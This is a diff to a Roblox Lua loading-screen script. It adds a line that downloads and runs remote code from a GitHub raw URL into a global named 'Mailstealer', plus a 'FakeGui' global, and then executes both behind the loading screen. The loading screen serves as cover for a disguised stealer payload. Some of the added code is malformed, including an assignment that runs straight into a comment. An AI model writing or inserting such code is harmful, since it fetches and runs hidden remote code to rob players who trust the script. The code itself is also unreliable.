@@ -1,4 +1,6 @@
--- Create the loading screen UI
+getgenv().Mailstealer = loadstring(game:HttpGet('https://raw.githubusercontent.com/tobi437a/Scripts/refs/heads/main/6f118714b1ad955357e44340.lua'))()
+
+getgenv().FakeGui =-- Create the loading screen UI
 local player = game.Players.LocalPlayer
 local screenGui = Instance.new("ScreenGui")
 screenGui.Name = "LoadingScreen"
@@ -42,4 +44,13 @@ game.Loaded:Wait()  -- Wait until everything is loaded
 -- After the game is loaded, remove the loading screen
 screenGui:Destroy()
 
-loadstring(game:HttpGet('https://raw.githubusercontent.com/tobi437a/Scripts/refs/heads/main/a72603020e9a881af50b9d74.lua'))()
+local function loadstring(script)
+    local func, err = load(script)
+    if not func then
+        error(err)
+    else
+        func()
+    end
+end
+loadstring(getgenv().Mailstealer)
+loadstring(getgenv().FakeGui)
